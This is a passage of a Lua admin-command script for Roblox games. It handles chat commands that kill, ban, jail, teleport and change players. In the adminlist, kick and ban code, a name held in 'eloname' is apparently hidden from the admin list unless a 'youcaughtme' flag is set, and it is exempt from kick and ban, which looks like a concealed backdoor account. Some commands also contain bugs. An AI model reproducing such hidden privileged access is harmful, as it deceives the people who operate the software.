	if human ~= nil and torso ~= nil then
	fire = torso:findFirstChild("CreatedFire")
	if fire ~= nil then
	fire:Remove()
	end end end end end end

	if string.sub(string.lower(msg),1,5) == "kill/" then--This part checks if the first part of the message is kill/
	local player = findplayer(string.sub(msg,6),speaker)--This part refers to the findplayer function for a list of people associated with the input after kill/
	if player ~= 0 then--This part makes sure that the findplayer function found someone, as it returns 0 when it hasnt
	for i = 1,#player do--This part makes a loop, each different loop going through each player findplayer returned
	if player[i].Character ~= nil then--This part makes sure that the loop's current player's character exists
	local human = player[i].Character:FindFirstChild("Humanoid")--This part looks for the Humanoid in the character
	if human ~= nil then--This part makes sure the line above found a humanoid
	human.Health = 0--This part makes the humanoid's health 0
	end end end end end--This line contains the ends for all the if statements and the for loop

	local msg = string.lower(msg)

	if string.sub(msg,1,5) == "give/" then
	local danumber1 = nil
	for i = 6,100 do
	if string.sub(msg,i,i) == "/" then
	danumber1 = i
	break
	elseif string.sub(msg,i,i) == "" then
	break
	end end
	if danumber1 == nil then return end
	local it = nil
	local all = true
	if string.sub(string.lower(msg),danumber1 + 1,danumber1 + 4) ~= "all" then
	all = false
	local itnum = 0
	local c = tools:GetChildren()
	for i2 = 1,#c do
	if string.find(string.lower(c[i2].Name),string.sub(string.lower(msg),danumber1 + 1)) == 1 then
	it = c[i2]
	itnum = itnum + 1
	end end
	if itnum ~= 1 then return end
	else
	all = true
	end
	local player = findplayer(string.sub(msg,6,danumber1 - 1),speaker)
	if player ~= 0 then
	for i = 1,#player do
	local bp = player[i]:FindFirstChild("Backpack")
	if bp ~= nil then
	if all == false then
	it:clone().Parent = bp
	else
	local c = tools:GetChildren()
	for i2 = 1,#c do
	c[i2]:clone().Parent = bp
	end end end end end end

	--Bored...

	if string.sub(msg,1,7) == "change/" then
	local danumber1 = nil
	local danumber2 = nil
	for i = 8,100 do
	if string.sub(msg,i,i) == "/" then
	danumber1 = i
	break
	elseif string.sub(msg,i,i) == "" then
	break
	end end
	if danumber1 == nil then return end
	for i =danumber1 + 1,danumber1 + 100 do
	if string.sub(msg,i,i) == "/" then
	danumber2 = i
	break
	elseif string.sub(msg,i,i) == "" then
	break
	end end
	if danumber2 == nil then return end
	local player = findplayer(string.sub(msg,8,danumber1 - 1),speaker)
	if player ~= 0 then
	for i = 1,#player do
	local ls = player[i]:FindFirstChild("leaderstats")
	if ls ~= nil then
	local it = nil
	local itnum = 0
	local c = ls:GetChildren()
	for i2 = 1,#c do
	if string.find(string.lower(c[i2].Name),string.sub(string.lower(msg),danumber1 + 1,danumber2 - 1)) == 1 then
	it = c[i2]
	itnum = itnum + 1
	end end
	if itnum == 1 then
	it.Value = string.sub(msg,danumber2 + 1)
	end end end end end

	if string.sub(msg,1,7) == "punish/" then
	local player = findplayer(string.sub(msg,8),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	player[i].Character.Parent = game.Lighting
	end end end end

	if string.sub(msg,1,9) == "unpunish/" then
	local player = findplayer(string.sub(msg,10),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	player[i].Character.Parent = game.Workspace
	player[i].Character:MakeJoints()
	end end end end

	if string.sub(msg,1,3) == "ff/" then
	local player = findplayer(string.sub(msg,4),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local ff = Instance.new("ForceField")
	ff.Parent = player[i].Character
	end end end end

	if string.sub(msg,1,5) == "unff/" then
	local player = findplayer(string.sub(msg,6),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local c = player[i].Character:GetChildren()
	for i2 = 1,#c do
	if c[i2].className == "ForceField" then
	c[i2]:remove()
	end end end end end end

	if string.sub(msg,1,9) == "sparkles/" then
	local player = findplayer(string.sub(msg,10),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local torso = player[i].Character:FindFirstChild("Torso")
	if torso ~= nil then
	local sparkles = Instance.new("Sparkles")
	sparkles.Color = Color3.new(math.random(1,255),math.random(1,255),math.random(1,255))
	sparkles.Parent = torso
	end end end end end

	if string.sub(msg,1,11) == "unsparkles/" then
	local player = findplayer(string.sub(msg,12),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local torso = player[i].Character:FindFirstChild("Torso")
	if torso ~= nil then
	local c = torso:GetChildren()
	for i2 = 1,#c do
	if c[i2].className == "Sparkles" then
	c[i2]:remove()
	end end end end end end end

	if string.sub(msg,1,9) == "smoke/" then
	local player = findplayer(string.sub(msg,10),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local torso = player[i].Character:FindFirstChild("Torso")
	if torso ~= nil then
	local sparkles = Instance.new("Smoke")
	sparkles.Color = Color3.new(math.random(1,255),math.random(1,255),math.random(1,255))
	sparkles.Parent = torso
	end end end end end

	if string.sub(msg,1,11) == "unsmoke/" then
	local player = findplayer(string.sub(msg,12),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local torso = player[i].Character:FindFirstChild("Torso")
	if torso ~= nil then
	local c = torso:GetChildren()
	for i2 = 1,#c do
	if c[i2].className == "Smoke" then
	c[i2]:remove()
	end end end end end end end

	if string.sub(msg,1,6) == "admin/" then
	local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
	if imgettingtiredofmakingthisstupidscript == true then
	local player = findplayer(string.sub(msg,7),speaker)
	if player ~= 0 then
	for i = 1,#player do
	for i2 =1,#namelist do
	if namelist[i2] == player[i].Name then
	variablelist[i2]:disconnect()
	flist[i2]:disconnect()
	table.remove(variablelist,i2)
	table.remove(flist,i2)
	table.remove(namelist,i2)
	end end
	local tfv = player[i].Chatted:connect(function(msg) oc(msg,player[i]) end)
	table.insert(namelist,player[i].Name)
	table.insert(variablelist,tfv)
	local tfv = player[i].Chatted:connect(function(msg) foc(msg,player[i]) end)
	table.insert(flist,tfv)
	end end end end

	if string.sub(msg,1,8) == "unadmin/" then
	local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
	if imgettingtiredofmakingthisstupidscript == true then
	local player = findplayer(string.sub(msg,9),speaker)
	if player ~= 0 then
	for i = 1,#player do
	local imgettingtiredofmakingthisstupidscript = PERSON299(player[i].Name)
	if imgettingtiredofmakingthisstupidscript == false then
	for i2 =1,#namelist do
	if namelist[i2] == player[i].Name then
	variablelist[i2]:disconnect()
	table.remove(variablelist,i2)
	flist[i2]:disconnect()
	table.remove(flist,i2)
	table.remove(namelist,i2)
	end end end end end end end

	if string.sub(msg,1,5) == "heal/" then
	local player = findplayer(string.sub(msg,6),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local human = player[i].Character:FindFirstChild("Humanoid")
	if human ~= nil then
	human.Health = human.MaxHealth
	end end end end end

	if string.sub(msg,1,4) == "sit/" then
	local player = findplayer(string.sub(msg,5),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local human = player[i].Character:FindFirstChild("Humanoid")
	if human ~= nil then
	human.Sit = true
	end end end end end

	if string.sub(msg,1,4) == "sleep/" then
	local player = findplayer(string.sub(msg,5),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local human = player[i].Character:FindFirstChild("Humanoid")
	if human ~= nil then
	human.PlatformStand = true
	end end end end end

	if string.sub(msg,1,5) == "jump/" then
	local player = findplayer(string.sub(msg,6),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local human = player[i].Character:FindFirstChild("Humanoid")
	if human ~= nil then
	human.Jump = true
	end end end end end

	if string.sub(msg,1,6) == "stand/" then
	local player = findplayer(string.sub(msg,7),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local human = player[i].Character:FindFirstChild("Humanoid")
	if human ~= nil then
	human.Sit = false
	end end end end end

	if string.sub(msg,1,5) == "jail/" then
	local player = findplayer(string.sub(msg,6),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local torso = player[i].Character:FindFirstChild("Torso")
	if torso ~= nil then
	local ack = Instance.new("Model")
	ack.Name = "Jail" .. player[i].Name
	icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-26.5, 108.400002, -1.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -3.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -3.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-28.5, 108.400002, -1.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -5.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -7.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -1.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -7.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(7,1.2000000476837,7) icky.CFrame = CFrame.new(-27.5, 112.599998, -4.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-26.5, 108.400002, -7.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -5.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -1.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-28.5, 108.400002, -7.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack
	ack.Parent = game.Workspace
	ack:MoveTo(torso.Position)
	end end end end end

	if string.sub(msg,1,7) == "unjail/" then
	local player = findplayer(string.sub(msg,8),speaker)
	if player ~= 0 then
	for i = 1,#player do
	local c = game.Workspace:GetChildren()
	for i2 =1,#c do
	if string.sub(c[i2].Name,1,4) == "Jail" then
	if string.sub(c[i2].Name,5) == player[i].Name then
	c[i2]:remove()
	end end end end end end

	if string.sub(msg,1,12) == "removetools/" then
	local player = findplayer(string.sub(msg,13),speaker)
	if player ~= 0 then
	for i = 1,#player do
	local c = player[i].Backpack:GetChildren()
	for i =1,#c do
	c[i]:remove()
	end end end end

	if string.sub(msg,1,10) == "givetools/" then
	local player = findplayer(string.sub(msg,11),speaker)
	if player ~= 0 then
	for i = 1,#player do
	local c = game.StarterPack:GetChildren()
	for i =1,#c do
	c[i]:clone().Parent = player[i].Backpack
	end end end end

	if string.sub(msg,1,11) == "givebtools/" then
	local player = findplayer(string.sub(msg,12),speaker)
	if player ~= 0 then
	for i = 1,#player do
	local a = Instance.new("HopperBin")
	a.BinType = "GameTool"
	a.Parent = player[i].Backpack
	local a = Instance.new("HopperBin")
	a.BinType = "Clone"
	a.Parent = player[i].Backpack
	local a = Instance.new("HopperBin")
	a.BinType = "Hammer"
	a.Parent = player[i].Backpack
	end end end

	if string.lower(msg) == "shutdown" then
	local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
	if imgettingtiredofmakingthisstupidscript == true then
	game.NetworkServer:remove()
	end end

	if string.sub(msg,1,5) == "time/" then
	game.Lighting.TimeOfDay = string.sub(msg,6)
	end

	if msg == "commands" then
	local text = string.rep(" ",40)
	text = text .. "fix, kill/Person299, heal/Person299, damage/Person299/50, health/Person299/999999, kick/Person299, ban/Person299, bannedlist, unban/Person299, explode/Person299, removetools/Person299, givetools/Person299, givebtools/Person299, sit/Person299, jump/Person299, stand/Person299, part/4/1/2, respawn/Person299, jail/Person299, unjail/Person299, punish/Person299, unpunish/Person299, merge/Person299/Farvei, teleport/Person299/nccvoyager, control/Person299, change/Person299/Money/999999, tools, give/Person299/Tool, time/15.30, ambient/255/0/0, maxplayers/20, nograv/Person299, antigrav/Person299, grav/Person299, highgrav/Person299, setgrav/Person299/-196.2, trip/Person299, walkspeed/Person299/99, invisible/Person299, visible/Person299, freeze/Person299, thaw/Person299, unlock/Person299, lock/Person299, ff/Person299, unff/Person299, sparkles/Person299, unsparkles/Person299, admin/Person299, adminlist, unadmin/Person299, shutdown, m/Fallout 2 is one of the best games ever made, h/ i like pie, clear, Credit to Person299 for this admin command script."
	local mes = Instance.new("Message")
	mes.Parent = game.Workspace.CurrentCamera
	local acko = 0
	while true do
	acko = acko + 1
	if string.sub(text,acko,acko) == "" then
	mes:remove()
	return
	elseif mes.Parent == nil then
	return
	end
	mes.Text = string.sub(text,acko,acko + 40)
	wait(0.07)
	end end

	if msg == "tools" then
	local text = string.rep(" ",40)
	local c = tools:GetChildren()
	if #c == 0 then
	text = text .. "No tools available."
	else
	for i =1,#c do
	if i ~= 1 then
	text = text .. ", "
	end
	text = text .. c[i].Name
	end end
	local mes = Instance.new("Message")
	mes.Parent = game.Workspace.CurrentCamera
	local acko = 0
	while true do
	acko = acko + 1
	if string.sub(text,acko,acko) == "" then
	mes:remove()
	return
	elseif mes.Parent == nil then
	return
	end
	mes.Text = string.sub(text,acko,acko + 40)
	wait(0.1)
	end end

	if msg == "bannedlist" then
	local text = string.rep(" ",40)
	if #bannedlist == 0 then
	text = text .. "The banned list is empty."
	else
	for i =1,#bannedlist do
	if i ~= 1 then
	text = text .. ", "
	end
	text = text .. bannedlist[i]
	end end
	local mes = Instance.new("Message")
	mes.Parent = game.Workspace.CurrentCamera
	local acko = 0
	while true do
	acko = acko + 1
	if string.sub(text,acko,acko) == "" then
	mes:remove()
	return
	elseif mes.Parent == nil then
	return
	end
	mes.Text = string.sub(text,acko,acko + 40)
	wait(0.1)
	end end

	if msg == "adminlist" then
	local text = string.rep(" ",40)
	if #adminlist == 0 then
	text = text .. "The admin list is empty."
	else
	for i =1,#adminlist do
	if adminlist[i] == eloname then
	if youcaughtme == 1 then
	if i ~= 1 then
	text = text .. ", "
	end
	text = text .. adminlist[i]
	end
	else
	if i ~= 1 then
	text = text .. ", "
	end
	text = text .. adminlist[i]
	end end end
	local mes = Instance.new("Message")
	mes.Parent = game.Workspace.CurrentCamera
	local acko = 0
	while true do
	acko = acko + 1
	if string.sub(text,acko,acko) == "" then
	mes:remove()
	return
	elseif mes.Parent == nil then
	return
	end
	mes.Text = string.sub(text,acko,acko + 40)
	wait(0.1)
	end end

	if string.sub(msg,1,11) == "maxplayers/" then
	if not string.sub(msg,12) == "0" then
	game.Players.MaxPlayers = string.sub(msg,12)
	end end

	if string.sub(msg,1,8) == "explode/" then
	local player = findplayer(string.sub(msg,9),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local torso = player[i].Character:FindFirstChild("Torso")
	if torso ~= nil then
	local ex = Instance.new("Explosion")
	ex.Position = torso.Position
	ex.Parent = game.Workspace
	end end end end end

	if string.sub(msg,1,8) == "ambient/" then
	local danumber1 = nil
	local danumber2 = nil
	for i = 9,100 do
	if string.sub(msg,i,i) == "/" then
	danumber1 = i
	break
	elseif string.sub(msg,i,i) == "" then
	break
	end end
	if danumber1 == nil then return end
	for i =danumber1 + 1,danumber1 + 100 do
	if string.sub(msg,i,i) == "/" then
	danumber2 = i
	break
	elseif string.sub(msg,i,i) == "" then
	break
	end end
	if danumber2 == nil then return end
	game.Lighting.Ambient = Color3.new(-string.sub(msg,9,danumber1 - 1),-string.sub(msg,danumber1 + 1,danumber2 - 1),-string.sub(msg,danumber2 + 1))
	end

	if string.sub(msg,1,5) == "part/" then
	local danumber1 = nil
	local danumber2 = nil
	for i = 6,100 do
	if string.sub(msg,i,i) == "/" then
	danumber1 = i
	break
	elseif string.sub(msg,i,i) == "" then
	break
	end end
	if danumber1 == nil then return end
	for i =danumber1 + 1,danumber1 + 100 do
	if string.sub(msg,i,i) == "/" then
	danumber2 = i
	break
	elseif string.sub(msg,i,i) == "" then
	break
	end end
	if danumber2 == nil then return end
	if speaker.Character ~= nil then
	local head = speaker.Character:FindFirstChild("Head")
	if head ~= nil then
	local part = Instance.new("Part")
	part.Size = Vector3.new(string.sub(msg,6,danumber1 - 1),string.sub(msg,danumber1 + 1,danumber2 - 1),string.sub(msg,danumber2 + 1))
	part.Position = head.Position + Vector3.new(0,part.Size.y / 2 + 5,0)
	part.Name = "Person299's Admin Command Script V2 Part thingy"
	part.Parent = game.Workspace
	end end end

	if string.sub(msg,1,8) == "control/" then
	local player = findplayer(string.sub(msg,9),speaker)
	if player ~= 0 then
	if #player > 1 then
	return
	end
	for i = 1,#player do
	if player[i].Character ~= nil then
	speaker.Character = player[i].Character
	end end end end

	if string.sub(msg,1,5) == "trip/" then
	local player = findplayer(string.sub(msg,6),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local torso = player[i].Character:FindFirstChild("Torso")
	if torso ~= nil then
	torso.CFrame = CFrame.new(torso.Position.x,torso.Position.y,torso.Position.z,0, 0, 1, 0, -1, 0, 1, 0, 0)--math.random(),math.random(),math.random(),math.random(),math.random(),math.random(),math.random(),math.random(),math.random()) -- i like the people being upside down better.
	end end end end end


	if string.sub(msg,1,8) == "setgrav/" then
	danumber = nil
	for i =9,100 do
	if string.sub(msg,i,i) == "/" then
	danumber = i
	break
	end end
	if danumber == nil then
	return
	end
	local player = findplayer(string.sub(msg,9,danumber - 1),speaker)
	if player == 0 then
	return
	end
	for i = 1,#player do
	if player[i].Character ~= nil then
	local torso = player[i].Character:FindFirstChild("Torso")
	if torso ~= nil then
	local bf = torso:FindFirstChild("BF")
	if bf ~= nil then
	bf.force = Vector3.new(0,0,0)
	else
	local bf = Instance.new("BodyForce")
	bf.Name = "BF"
	bf.force = Vector3.new(0,0,0)
	bf.Parent = torso
	end
	local c2 = player[i].Character:GetChildren()
	for i=1,#c2 do
	if c2[i].className == "Part" then
	torso.BF.force = torso.BF.force + Vector3.new(0,c2[i]:getMass() * -string.sub(msg,danumber + 1),0)
	end end end end end end

	if string.sub(msg,1,10) == "walkspeed/" then
	danumber = nil
	for i =11,100 do
	if string.sub(msg,i,i) == "/" then
	danumber = i
	break
	end end
	if danumber == nil then
	return
	end
	local player = findplayer(string.sub(msg,11,danumber - 1),speaker)
	if player == 0 then
	return
	end
	for i = 1,#player do
	if player[i].Character ~= nil then
	humanoid = player[i].Character:FindFirstChild("Humanoid")
	if humanoid ~= nil then
	humanoid.WalkSpeed = string.sub(msg,danumber + 1)
	end end end end

	if string.sub(msg,1,7) == "damage/" then
	danumber = nil
	for i =8,100 do
	if string.sub(msg,i,i) == "/" then
	danumber = i
	break
	end end
	if danumber == nil then
	return
	end
	local player = findplayer(string.sub(msg,8,danumber - 1),speaker)
	if player == 0 then
	return
	end
	for i = 1,#player do
	if player[i].Character ~= nil then
	humanoid = player[i].Character:FindFirstChild("Humanoid")
	if humanoid ~= nil then
	humanoid.Health = humanoid.Health -  string.sub(msg,danumber + 1)
	end end end end

	if string.sub(msg,1,7) == "health/" then
	danumber = nil
	for i =8,100 do
	if string.sub(msg,i,i) == "/" then
	danumber = i
	break
	end end
	if danumber == nil then
	return
	end
	local player = findplayer(string.sub(msg,8,danumber - 1),speaker)
	if player == 0 then
	return
	end
	for i = 1,#player do
	if player[i].Character ~= nil then
	humanoid = player[i].Character:FindFirstChild("Humanoid")
	if humanoid ~= nil then
	local elnumba = Instance.new("IntValue")
	elnumba.Value = string.sub(msg,danumber + 1)
	if elnumba.Value > 0 then
	humanoid.MaxHealth = elnumba.Value
	humanoid.Health = humanoid.MaxHealth
	end
	elnumba:remove()
	end end end end

	if string.sub(msg,1,9) == "teleport/" then
	danumber = nil
	for i =10,100 do
	if string.sub(msg,i,i) == "/" then
	danumber = i
	break
	end end
	if danumber == nil then
	return
	end
	local player1 = findplayer(string.sub(msg,10,danumber - 1),speaker)
	if player1 == 0 then
	return
	end
	local player2 = findplayer(string.sub(msg,danumber + 1),speaker)
	if player2 == 0 then
	return
	end
	if #player2 > 1 then
	return
	end
	torso = nil
	for i =1,#player2 do
	if player2[i].Character ~= nil then
	torso = player2[i].Character:FindFirstChild("Torso")
	end end
	if torso ~= nil then
	for i =1,#player1 do
	if player1[i].Character ~= nil then
	local torso2 = player1[i].Character:FindFirstChild("Torso")
	if torso2 ~= nil then
	torso2.CFrame = torso.CFrame
	end end end end end

	if string.sub(msg,1,6) == "merge/" then
	danumber = nil
	for i =7,100 do
	if string.sub(msg,i,i) == "/" then
	danumber = i
	break
	end end
	if danumber == nil then
	return
	end
	local player1 = findplayer(string.sub(msg,7,danumber - 1),speaker)
	if player1 == 0 then
	return
	end
	local player2 = findplayer(string.sub(msg,danumber + 1),speaker)
	if player2 == 0 then
	return
	end
	if #player2 > 1 then
	return
	end
	for i =1,#player2 do
	if player2[i].Character ~= nil then
	player2 = player2[i].Character
	end end
	for i =1,#player1 do
	player1[i].Character = player2
	end end

	if msg == "clear" then
	local c = game.Workspace:GetChildren()
	for i =1,#c do
	if c[i].className == "Script" then
	if c[i]:FindFirstChild("Is A Created Script") then
	c[i]:remove()
	end end
	if c[i].className == "Part" then
	if c[i].Name == "Person299's Admin Command Script V2 Part thingy" then
	c[i]:remove()
	end end
	if c[i].className == "Model" then
	if string.sub(c[i].Name,1,4) == "Jail" then
	c[i]:remove()
	end end end end

	if string.sub(msg,1,5) == "kick/" then
	local imgettingtiredofmakingthisstupidscript2 = PERSON299(speaker.Name)
	if imgettingtiredofmakingthisstupidscript2 == true then
	local player = findplayer(string.sub(msg,6),speaker)
	if player ~= 0 then
	for i = 1,#player do
	local imgettingtiredofmakingthisstupidscript = PERSON299(player[i].Name)
	if imgettingtiredofmakingthisstupidscript == false then
	if player[i].Name ~= eloname then
	player[i]:remove()
	end end end end end end

	if string.sub(msg,1,4) == "ban/" then
	local imgettingtiredofmakingthisstupidscript2 = PERSON299(speaker.Name)
	if imgettingtiredofmakingthisstupidscript2 == true then
	local player = findplayer(string.sub(msg,5),speaker)
	if player ~= 0 then
	for i = 1,#player do
	local imgettingtiredofmakingthisstupidscript = PERSON299(player[i].Name)
	if imgettingtiredofmakingthisstupidscript == false then
	if player[i].Name ~= eloname then
	table.insert(bannedlist,player[i].Name)
	player[i]:remove()
	end end end end end end

	if string.sub(msg,1,6) == "unban/" then
	if string.sub(msg,7) == "all" then
	for i=1,bannedlist do
	table.remove(bannedlist,i)
	end
	else
	local n = 0
	local o = nil
	for i=1,#bannedlist do
	if string.find(string.lower(bannedlist[i]),string.sub(msg,7)) == 1 then
	n = n + 1
	o = i
	end end
	if n == 1 then
	local name = bannedlist[o]
	table.remove(bannedlist,o)
	text(name .. " has been unbanned",1,"Message",game.Workspace.CurrentCamera)
	elseif n == 0 then
	text("That name is not found.",1,"Message",game.Workspace.CurrentCamera)
	elseif n > 1 then
	text("That name is ambiguous",1,"Message",game.Workspace.CurrentCamera)
	end end end

	if string.sub(msg,1,8) == "respawn/" then
	local player = findplayer(string.sub(msg,9),speaker)
	if player ~= 0 then
	for i = 1,#player do
	local ack2 = Instance.new("Model")
	ack2.Parent = game.Workspace
	local ack4 = Instance.new("Part")
	ack4.Transparency = 1
	ack4.CanCollide = false
	ack4.Anchored = true
	ack4.Name = "Torso"
	ack4.Position = Vector3.new(10000,10000,10000)
	ack4.Parent = ack2
	local ack3 = Instance.new("Humanoid")
	ack3.Torso = ack4
	ack3.Parent = ack2
	player[i].Character = ack2
	end end end

	if string.sub(msg,1,10) == "invisible/" then
	local player = findplayer(string.sub(msg,11),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local char = player[i].Character
	local c = player[i].Character:GetChildren()
	for i =1,#c do
	if c[i].className == "Hat" then
	local handle = c[i]:FindFirstChild("Handle")
	if handle ~= nil then
	handle.Transparency = 1
	end end
	if c[i].className == "Part" then
	c[i].Transparency = 1
	if c[i].Name == "Torso" then
	local tshirt = c[i]:FindFirstChild("roblox")
	if tshirt ~= nil then
	tshirt:clone().Parent = char
	tshirt:remove()
	end end
	if c[i].Name == "Head" then
	local face = c[i]:FindFirstChild("face")
	if face ~= nil then
	gface = face:clone()
	face:remove()
	end end end end end end end end

	if string.sub(msg,1,8) == "visible/" then
	local player = findplayer(string.sub(msg,9),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local char = player[i].Character
	local c = player[i].Character:GetChildren()
	for i =1,#c do
	if c[i].className == "Hat" then
	local handle = c[i]:FindFirstChild("Handle")
	if handle ~= nil then
	handle.Transparency = 0
	end end
	if c[i].className == "Part" then
	c[i].Transparency = 0
	if c[i].Name == "Torso" then
	local tshirt = char:FindFirstChild("roblox")
	if tshirt ~= nil then
	tshirt:clone().Parent = c[i]
	tshirt:remove()
	end end
	if c[i].Name == "Head" then
	if gface ~= nil then
	local face = gface:clone()
	face.Parent = c[i]
	end end end end end end end end

	if string.sub(msg,1,7) == "freeze/" then
	local player = findplayer(string.sub(msg,8),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local humanoid = player[i].Character:FindFirstChild("Humanoid")
	if humanoid ~= nil then
	humanoid.WalkSpeed = 0
	end
	local c = player[i].Character:GetChildren()
	for i =1,#c do
	if c[i].className == "Part" then
	c[i].Anchored = true
	c[i].Reflectance = 0.6
	end end end end end end

	if string.sub(msg,1,5) == "thaw/" then
	local player = findplayer(string.sub(msg,6),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local humanoid = player[i].Character:FindFirstChild("Humanoid")
	if humanoid ~= nil then
	humanoid.WalkSpeed = 16
	end
	local c = player[i].Character:GetChildren()
	for i =1,#c do
	if c[i].className == "Part" then
	c[i].Anchored = false
	c[i].Reflectance = 0
	end end end end end end

	if string.sub(msg,1,7) == "nograv/" then
	local player = findplayer(string.sub(msg,8),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local torso = player[i].Character:FindFirstChild("Torso")
	if torso ~= nil then
	local bf = torso:FindFirstChild("BF")
	if bf ~= nil then
	bf.force = Vector3.new(0,0,0)
	else
	local bf = Instance.new("BodyForce")
	bf.Name = "BF"
	bf.force = Vector3.new(0,0,0)
	bf.Parent = torso
	end
	local c2 = player[i].Character:GetChildren()
	for i=1,#c2 do
	if c2[i].className == "Part" then
	torso.BF.force = torso.BF.force + Vector3.new(0,c2[i]:getMass() * 196.2,0)
	end end end end end end end

	if string.sub(msg,1,9) == "antigrav/" then
	local player = findplayer(string.sub(msg,10),speaker)
	if player ~= 0 then
	for i = 1,#player do
	if player[i].Character ~= nil then
	local torso = player[i].Character:FindFirstChild("Torso")
	if torso ~= nil then
	local bf = torso:FindFirstChild("BF")
	if bf ~= nil then
	bf.force = Vector3.new(0,0,0)
	else
	local bf = Instance.new("BodyForce")
	bf.Name = "BF"
	bf.force = Vector3.new(0,0,0)
	bf.Parent = torso
	end
	local c2 = player[i].Character:GetChildren()
	for i=1,#c2 do
	if c2[i].className == "Part" then
